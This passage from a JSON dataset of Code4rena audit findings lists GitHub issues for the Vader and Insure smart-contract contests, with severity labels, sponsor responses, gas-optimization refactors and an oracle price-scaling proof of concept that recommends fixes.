Pairs"}, {"title": "validateGas does nothing", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/99", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged", "GasThrottle"], "target": "2021-12-vader-findings", "body": "validateGas does nothing"}, {"title": "denial of service", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/98", "labels": ["bug", "3 (High Risk)", "sponsor acknowledged", "VaderPoolV2"], "target": "2021-12-vader-findings", "body": "denial of service"}, {"title": "Users can lock themselves out of being able to convert VETH, becoming stuck with the deprecated asset", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/97", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "Users can lock themselves out of being able to convert VETH, becoming stuck with the deprecated asset"}, {"title": "Inclusion of salt and chainId in merkle tree leaves increases gas costs for no reason.", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/96", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed", "Converter"], "target": "2021-12-vader-findings", "body": "Inclusion of salt and chainId in merkle tree leaves increases gas costs for no reason."}, {"title": "wrong revert message", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/87", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "Converter"], "target": "2021-12-vader-findings", "body": "wrong revert message"}, {"title": "Modifier onlyUSDV() and function _onlyUSDV()", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/77", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "Vader"], "target": "2021-12-vader-findings", "body": "Modifier onlyUSDV() and function _onlyUSDV()"}, {"title": "Unnecessary supportedToken checks on swaps on VaderPoolV2", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/74", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "VaderPoolV2"], "target": "2021-12-vader-findings", "body": "Unnecessary supportedToken checks on swaps on VaderPoolV2"}, {"title": "Storage of previous prices and total liquidity weights is suboptimal for gas costs", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/73", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "Storage of previous prices and total liquidity weights is suboptimal for gas costs"}, {"title": "VaderPoolV2 owner can steal all user assets which are approved VaderPoolV2", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/72", "labels": ["bug", "3 (High Risk)", "VaderPoolV2"], "target": "2021-12-vader-findings", "body": "VaderPoolV2 owner can steal all user assets which are approved VaderPoolV2"}, {"title": "Reserve does not properly apply prices of VADER and USDV tokens", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/71", "labels": ["bug", "3 (High Risk)", "VaderReserve"], "target": "2021-12-vader-findings", "body": "Reserve does not properly apply prices of VADER and USDV tokens"}, {"title": "Oracle returns an improperly scaled USDV/VADER price", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/70", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "# Handle  TomFrenchBlockchain   # Vulnerability details  ## Impact  Invalid values returned from oracle in vast majority of situations  ## Proof of Concept  The LBT oracle does not properly scale values when calculating prices for VADER or USDV. To show this we consider the simplest case where we expect USDV to return a value of $1 and show that the oracle does not return this value.  Consider the case of the LBT oracle tracking a single USDV-DAI pair where USDV trades 1:1 for DAI and Chainlink reports that DAI is exactly $1. We then work through the lines linked below:  https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/lbt/LiquidityBasedTWAP.sol#L393-L409  For L397 we get a value of 1e8 as Chainlink reports the price of DAI with 8 decimals of accuracy. ``` foreignPrice = getChainlinkPrice(address(foreignAsset)); foreignPrice = 1e8 ```  We can set `liquidityWeights[i]` and `totalUSDVLiquidityWeight` both to 1 as we only consider a single pair so L399-401 becomes ``` totalUSD = foreignPrice; totalUSD = 1e8; ```  L403-408 is slightly more complex but from looking at the links below we can calculate `totalUSDV` as shown https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/dex-v2/pool/VaderPoolV2.sol#L81-L90 https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/external/libraries/FixedPoint.sol#L137-L160  ``` totalUSDV = pairData     .nativeTokenPriceAverage     .mul(pairData.foreignUnit)     .decode144() // pairData.nativeTokenPriceAverage == 2**112 // pairData.foreignUnit = 10**18 // decode144(x) = x >> 112 totalUSDV = (2**112).mul(10**18).decode144() totalUSDV = 10**18 ```  Using `totalUSD` and `totalUSDV` we can then calculate the return value of `_calculateUSDVPrice`  ``` returnValue = (totalUSD * 1 ether) / totalUSDV;  returnValue = 1e8 * 1e18 / 1e18  returnValue = 1e8 ```  For the oracle implementation to be correct we then expect that the Vader protocol to treat values of 1e8 from the oracle to mean USDV is worth $1. However from the lines of code linked below we can safely assume that it is intended to be that values of 1e18 represent $1 rather than 1e8.  https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/tokens/USDV.sol#L76 https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/tokens/USDV.sol#L109  High severity issue as the oracle is crucial for determining the exchange rate between VADER and USDV to be used for IL protection and minting/burning of USDV - an incorrect value will result in the protocol losing significant funds.  ## Recommended Mitigation Steps  Go over oracle calculation again to ensure that various scale factors are properly accounted for. Some handling of the difference in the number of decimals between the chainlink oracle and the foreign asset should be added.  Build a test suite to ensure that the oracle returns the expected values for simple situations.  "}, {"title": "Unnecessary checks on VADER token address in oracle.", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/69", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "Unnecessary checks on VADER token address in oracle."}, {"title": "VaderMath:calculateSwapReverse require statement change to <= instead of <", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/61", "labels": ["bug", "1 (Low Risk)", "VaderMath"], "target": "2021-12-vader-findings", "body": "VaderMath:calculateSwapReverse require statement change to <= instead of <"}, {"title": "Functions to calculate synth name/symbol should live in factory to reduce bytecode", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/58", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "Synth"], "target": "2021-12-vader-findings", "body": "Functions to calculate synth name/symbol should live in factory to reduce bytecode"}, {"title": "LPs of VaderPoolV2 can manipulate pool reserves to extract funds from the reserve.", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/55", "labels": ["bug", "3 (High Risk)", "VaderPoolV2", "VaderRouterV2"], "target": "2021-12-vader-findings", "body": "LPs of VaderPoolV2 can manipulate pool reserves to extract funds from the reserve."}, {"title": "No way to remove GasThrottle from VaderPool after deployment", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/52", "labels": ["bug", "2 (Med Risk)", "VaderPool"], "target": "2021-12-vader-findings", "body": "No way to remove GasThrottle from VaderPool after deployment"}, {"title": "Make use of a bitmap for claims to save gas in Converter.sol", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/48", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "Converter"], "target": "2021-12-vader-findings", "body": "Make use of a bitmap for claims to save gas in Converter.sol"}, {"title": "USDV minting limit is not applied if `cycleTimestamp <= block.timestamp`", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/45", "labels": ["bug", "1 (Low Risk)", "USDV"], "target": "2021-12-vader-findings", "body": "USDV minting limit is not applied if `cycleTimestamp <= block.timestamp`"}, {"title": "Council veto protection does not work", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/44", "labels": ["bug", "3 (High Risk)", "sponsor acknowledged", "GovernorAlpha"], "target": "2021-12-vader-findings", "body": "Council veto protection does not work"}, {"title": "VaderMath:calculateSlipAdjustment() wrong comments", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/43", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "VaderMath"], "target": "2021-12-vader-findings", "body": "VaderMath:calculateSlipAdjustment() wrong comments"}, {"title": "Oracle doesn't calculate USDV/VADER price correctly", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/42", "labels": ["bug", "3 (High Risk)", "sponsor acknowledged", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "Oracle doesn't calculate USDV/VADER price correctly"}, {"title": "unsafe cast", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/41", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged", "LinearVesting"], "target": "2021-12-vader-findings", "body": "unsafe cast"}, {"title": "Oracle can be manipulted to consider only a single pair for pricing", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/40", "labels": ["bug", "2 (Med Risk)", "sponsor disputed", "LiquidityBasedTWAP"], "target": "2021-12-vader-findings", "body": "Oracle can be manipulted to consider only a single pair for pricing"}, {"title": "transfer return value of a general ERC20 is ignored", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/39", "labels": ["bug", "0 (Non-critical)", "sponsor disputed"], "target": "2021-12-vader-findings", "body": "transfer return value of a general ERC20 is ignored"}, {"title": "Never used parameters", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/35", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "Never used parameters"}, {"title": "Solidity compiler versions mismatch", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/31", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "Solidity compiler versions mismatch"}, {"title": "Upgrade pragma to at least 0.8.4", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/25", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "Upgrade pragma to at least 0.8.4"}, {"title": "State variables that could be set immutable", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/19", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "State variables that could be set immutable"}, {"title": "Storage double reading. Could save SLOAD", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/15", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "Storage double reading. Could save SLOAD"}, {"title": "Unused state variables", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/13", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "Unused state variables"}, {"title": "Use bytes32 instead of string to save gas whenever possible", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/12", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "Use bytes32 instead of string to save gas whenever possible"}, {"title": "Unused imports", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/11", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "Unused imports"}, {"title": "wrong comment", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/9", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged", "BasePool"], "target": "2021-12-vader-findings", "body": "wrong comment"}, {"title": "Redudant 2nd call to lastTimeRewardApplicable in StakingRewards.sol", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/8", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "StakingRewards"], "target": "2021-12-vader-findings", "body": "Redudant 2nd call to lastTimeRewardApplicable in StakingRewards.sol"}, {"title": "VaderReserve.reimburseImpermanentLoss improperly converts USDV to VADER", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/7", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged"], "target": "2021-12-vader-findings", "body": "VaderReserve.reimburseImpermanentLoss improperly converts USDV to VADER"}, {"title": "Redemption value of synths can be manipulated to drain `VaderPoolV2` of all native assets in the associated pair", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/5", "labels": ["bug", "3 (High Risk)", "sponsor acknowledged", "VaderPoolV2"], "target": "2021-12-vader-findings", "body": "Redemption value of synths can be manipulated to drain `VaderPoolV2` of all native assets in the associated pair"}, {"title": "Core AMM logic is written to give the impression it is working on a different asset than it is.", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/4", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged", "VaderMath"], "target": "2021-12-vader-findings", "body": "Core AMM logic is written to give the impression it is working on a different asset than it is."}, {"title": "VaderPoolV2.mintFungible exposes users to unlimited slippage", "html_url": "https://github.com/code-423n4/2021-12-vader-findings/issues/2", "labels": ["bug", "2 (Med Risk)", "sponsor acknowledged", "VaderPoolV2"], "target": "2021-12-vader-findings", "body": "VaderPoolV2.mintFungible exposes users to unlimited slippage"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/362", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-01-insure-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-03-neotokyo-findings/blob/main/data/atharvasama-G.md)."}, {"title": "Gas: Avoid expensive calculation by checking if `originalLiquidity() == 0`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/361", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Checking if the value is 0 before returning 0 is less expensive than returning a calculation that's equal to 0  ## Proof of Concept In `PoolTemplate.sol:rate()`, the code is as follows: ``` File: PoolTemplate.sol 744:     function rate() external view returns (uint256) { 745:         if (totalSupply() > 0) { 746:             return (originalLiquidity() * MAGIC_SCALE_1E6) / totalSupply(); 747:         } else { 748:             return 0; 749:         } 750:     }  ``` It can be optimized as such: ``` 744:     function rate() external view returns (uint256) { 745:         uint256 originalLiquidity = originalLiquidity(); 746:         if (originalLiquidity != 0 && totalSupply() > 0) { 747:             return (originalLiquidity * MAGIC_SCALE_1E6) / totalSupply(); 748:         } else { 749:             return 0; 750:         } 751:     }  ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Cache the loaded storage value in a memory variable and make the 0 checks to avoid unnecessary calculations if `originalLiquidity() == 0`  "}, {"title": "Gas: Optimize Conditional Statements in `PoolTemplate.sol:worth()`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/355", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact It's possible to save gas by optimizing the checks in conditional statements (`if`, `else if` and `else`). This would save a few opcodes and avoid redundant checks.  ## Proof of Concept In `PoolTemplate.sol:worth()`, the code is as follows: ``` 799:     function worth(uint256 _value) public view returns (uint256 _amount) { 800:         uint256 _supply = totalSupply(); 801:         uint256 _originalLiquidity = originalLiquidity(); 802:         if (_supply > 0 && _originalLiquidity > 0) { 803:             _amount = (_value * _supply) / _originalLiquidity; 804:         } else if (_supply > 0 && _originalLiquidity == 0) { 805:             _amount = _value * _supply; 806:         } else { 807:             _amount = _value; 808:         } 809:     } ```  The conditions checks can be optimized with the following (read the `@audit-info` comments for further information): ```     function worth(uint256 _value) public view returns (uint256 _amount) {         uint256 _supply = totalSupply();         uint256 _originalLiquidity = originalLiquidity();         if (_supply == 0) {             _amount = _value;         } else if (_originalLiquidity == 0) {             _amount = _value * _supply;         } else {             _amount = (_value * _supply) / _originalLiquidity;         }     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Compact conditions in mentioned logic statements   "}, {"title": "Index compensate is 0 when totalLiquidity() is enough to cover the whole amount", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/354", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact In IndexTemplate, function compensate, When _amount > _value, and <= totalLiquidity(), the value of _compensated is not set, so it gets a default value of 0: ```solidity if (_value >= _amount) {     ...     _compensated = _amount; } else {     ...     if (totalLiquidity() < _amount) {         ...         _compensated = _value + _cds;     }     vault.offsetDebt(_compensated, msg.sender); } ```  But nevertheless, in both cases, it calls vault.offsetDebt, even when the _compensated is 0 (no else block).  ## Recommended Mitigation Steps I think, in this case, it should try to redeem the premium (withdrawCredit?) to cover the whole amount, but I am not sure about the intentions as I didn't have enough time to understand this protocol in depth.  "}, {"title": "Unbounded iteration over all indexes (2)", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/352", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact The transactions could fail if the array get too big and the transaction would consume more gas than the block limit. This will then result in a denial of service for the desired functionality and break core functionality.  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L703  ## Tools Used VS Code  ## Recommended Mitigation Steps Keep the array size small.  "}, {"title": "Gas: `incident.payoutDenominator` is used only once. It shouldn't be stored in a variable.", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/350", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost (1 MSTORE and 1 MLOAD)  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L553 There's no readability or gas gain from copying `incident.payoutDenominator` to a variable as it's used only once in the method.  ## Tools Used VS Code  ## Recommended Mitigation Steps Do not store this data in a variable  "}, {"title": "Gas: `incident.payoutNumerator` is used only once. It shouldn't be stored in a variable.", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/349", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost (1 MSTORE and 1 MLOAD)  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L552 There's no readability or gas gain from copying `incident.payoutNumerator` to a variable as it's used only once in the method.  ## Tools Used VS Code  ## Recommended Mitigation Steps Do not store this data in a variable  "}, {"title": "Insurance Pool Locking Does Not Propagate To All Markets", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/347", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "Insurance Pool Locking Does Not Propagate To All Markets"}, {"title": "Gas: `PoolTemplate:initialize()::_conditions` should be a fixed array of size 2", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/345", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "Gas: `PoolTemplate:initialize()::_conditions` should be a fixed array of size 2"}, {"title": "Gas: Avoid expensive calculation by checking if `valueAll() == 0`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/344", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Checking if the value is 0 before returning 0 is less expensive than returning a calculation that's equal to 0  ## Proof of Concept In `Vault.sol:underlyingValue()`, the code is as follows: ``` Vault.sol 400:     function underlyingValue(address _target) 401:         public 402:         view 403:         override 404:         returns (uint256) 405:     { 406:         if (attributions[_target] > 0) { 407:             return (valueAll() * attributions[_target]) / totalAttributions; 408:         } else { 409:             return 0; 410:         } 411:     } ``` It can be optimized as such:  ``` 406:         uint256 valueAll = valueAll(); 407:         if (valueAll != 0 && attributions[_target] > 0) { 408:             return (valueAll * attributions[_target]) / totalAttributions; 409:         } else { 410:             return 0; 411:         } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Cache the loaded storage value in a memory variable and make the 0 checks to avoid unnecessary calculations if `valueAll() == 0`  "}, {"title": "Gas: Cache `attributions[_target]` in `Vault.sol:underlyingValue()`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/343", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact SLOADs are expensive  ## Proof of Concept Here, `attributions[_target]` can be loaded twice from storage: ``` Vault.sol 400:     function underlyingValue(address _target) 401:         public 402:         view 403:         override 404:         returns (uint256) 405:     { 406:         if (attributions[_target] > 0) { 407:             return (valueAll() * attributions[_target]) / totalAttributions; 408:         } else { 409:             return 0; 410:         } 411:     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Cache the loaded storage value in a memory variable  "}, {"title": "Pause check missing on the several functions (PoolTemplate)", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/339", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "Pause check missing on the several functions (PoolTemplate)"}, {"title": "Misleading comments and documentation", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/337", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact There are some issues with comments/documentation, e.g.: Misleading comment: ```solidity    * @return true if the id within the market already exists   function getCDS(address _address) external view override returns (address) ``` No such function (present in documentation): ```solidity   function getInsuranceCount(address _user) ``` \"getInsuranceCount returns how many insurance policies the specified user has.\"  ## Recommended Mitigation Steps Consider revisiting and updating discrepancies between the documentation and comments.  "}, {"title": "Ordering importance in a struct", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/334", "labels": ["bug", "help wanted", "0 (Non-critical)", "disagree with severity", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Kumpirmafyas   # Vulnerability details  ## Impact The order of the \"struct Template\" in the Factory.sol contract is as follows: 1-bool isOpen 2-bool approval 3-bool allowDuplicate https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L44-L48   The struct above is used in functions as value, in the \"key=>value\" part in this mapping. https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L49  When using \"template\" mapping in this function, it is not done in the defined order, Detail: - isOpen bool , defined in Struct in the 1st row, -isOpen bool ,defined in the 1st position in Mapping, naturally -isOpen bool is defined in the 2nd row in the \"approveTemplate\" function below. -The same applies to the approvel bool struct.  https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L101-L103   The problem here is; The order in which Structs are used in a Function is not. Problem ; The order of the structs in the \"key => value\" mapping definition affects the function. Sequencing is important in struct definition in mappings.   ## Recommended Mitigation Steps The order in the struct = the order in the mapping = the order in the function must be the same.  Here ; Sorting in Mapping with Struct is a mandatory condition, while sorting in a function is within the scope of clean code.  "}, {"title": "Order of statements", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/332", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Statements should be ordered in a way that it costs less gas, that is, less operations are performed when the validating conditions are wrong. e.g. this can be reordered: ```solidity   //Distribute premium and fee   uint256 _endTime = _span + block.timestamp;   uint256 _premium = getPremium(_amount, _span);   uint256 _fee = parameters.getFeeRate(msg.sender);    require(       _amount <= availableBalance(),       \"ERROR: INSURE_EXCEEDED_AVAILABLE_BALANCE\"   );   require(_premium <= _maxCost, \"ERROR: INSURE_EXCEEDED_MAX_COST\");   require(_span <= 365 days, \"ERROR: INSURE_EXCEEDED_MAX_SPAN\");   require(       parameters.getMinDate(msg.sender) <= _span,       \"ERROR: INSURE_SPAN_BELOW_MIN\"   );    require(       marketStatus == MarketStatus.Trading,       \"ERROR: INSURE_MARKET_PENDING\"   );   require(paused == false, \"ERROR: INSURE_MARKET_PAUSED\"); ``` to something like this: ```solidity   require(paused == false, \"ERROR: INSURE_MARKET_PAUSED\");   require(       marketStatus == MarketStatus.Trading,       \"ERROR: INSURE_MARKET_PENDING\"   );    require(       _amount <= availableBalance(),       \"ERROR: INSURE_EXCEEDED_AVAILABLE_BALANCE\"   );    require(_span <= 365 days, \"ERROR: INSURE_EXCEEDED_MAX_SPAN\");   require(       parameters.getMinDate(msg.sender) <= _span,       \"ERROR: INSURE_SPAN_BELOW_MIN\"   );    //Distribute premium and fee   uint256 _premium = getPremium(_amount, _span);   require(_premium <= _maxCost, \"ERROR: INSURE_EXCEEDED_MAX_COST\");    uint256 _endTime = _span + block.timestamp;   uint256 _fee = parameters.getFeeRate(msg.sender); ```  "}, {"title": "Gas: Cache `_fee[_target]` in `Parameters.sol:getFeeRate()`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/320", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact SLOADs are expensive  ## Proof of Concept Here, `_fee[_target]` can be loaded twice from storage: ``` 271:     function getFeeRate(address _target) 272:         external 273:         view 274:         override 275:         returns (uint256) 276:     { 277:         if (_fee[_target] == 0) { 278:             return _fee[address(0)]; 279:         } else { 280:             return _fee[_target]; 281:         } 282:     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Cache the storage reading in a memory variable  "}, {"title": "Gas Optimization: Use unchecked for safe math", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/317", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  gzeon   # Vulnerability details  ## Impact Use unchecked for safe math to save gas, for example: https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/PremiumModels/BondingPremium.sol#L176 ```         premiumRate = premiumRate / T_1 / (u1 - u2) / BASE; ``` Since we have 1) T_1 != 0 (L229) 2) (u1 - u2) != 0 (L126-132) 3) BASE != 0 (L28) we can safely wrap this line in an unchecked block  "}, {"title": "Add a timelock to `Parameters:setFeeRate`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/315", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "Add a timelock to `Parameters:setFeeRate`"}, {"title": "Validate _to is not empty", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/314", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact _withdrawAttribution should validate that _to is not an empty address 0x0 to prevent accidental burns. Similarly, transferValue _destination param and withdrawValue _to param should also be checked against an empty address unless this is the intended functionality in some cases.  ## Recommended Mitigation Steps require _to != address(0)  "}, {"title": "getLockup and getWithdrawable can change after withdrawalReq is initiated", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/312", "labels": ["bug", "1 (Low Risk)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "getLockup and getWithdrawable can change after withdrawalReq is initiated"}, {"title": "`targetLev` can be set to 0 in `IndexTemplate:setLeverage`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/311", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact  Division by 0 or functionally incorrect `targetLev`  ## POC A division by `targetLev` is made here : https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L306 and `targetLev` can be set to 0 : https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L575  ## Tools Used VS Code  ## Recommended Mitigation Steps Either make a check on `targetLev` before setting it here: https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L575 or make a check before the division here: https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L306   "}, {"title": "Insurance NFT", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/310", "labels": ["bug", "0 (Non-critical)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "Insurance NFT"}, {"title": "deposit and _depositFrom are almost similar", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/309", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-01-insure-findings", "body": "deposit and _depositFrom are almost similar"}, {"title": "Repeated math operations", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/308", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact Can be refactored, from this: ```solidity   require(       request.timestamp +           parameters.getLockup(msg.sender) <           block.timestamp,       \"ERROR: WITHDRAWAL_QUEUE\"   );   require(       request.timestamp +           parameters.getLockup(msg.sender) +           parameters.getWithdrawable(msg.sender) >           block.timestamp,       \"ERROR: WITHDRAWAL_NO_ACTIVE_REQUEST\"   ); ``` to this: ```solidity   uint256 unlocksAt = request.timestamp + parameters.getLockup(msg.sender);   require(       unlocksAt < block.timestamp,       \"ERROR: WITHDRAWAL_QUEUE\"   );   require(       unlocksAt + parameters.getWithdrawable(msg.sender) > block.timestamp,       \"ERROR: WITHDRAWAL_NO_ACTIVE_REQUEST\"   ); ```  There are more places where this optimization could be applied besides the provided example, but the basic idea is to cache the result of repeated math operation when the value does not change.  "}, {"title": "repayDebt optimization", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/307", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  pauliax   # Vulnerability details  ## Impact function repayDebt could be refactored to reduce deployment and operational 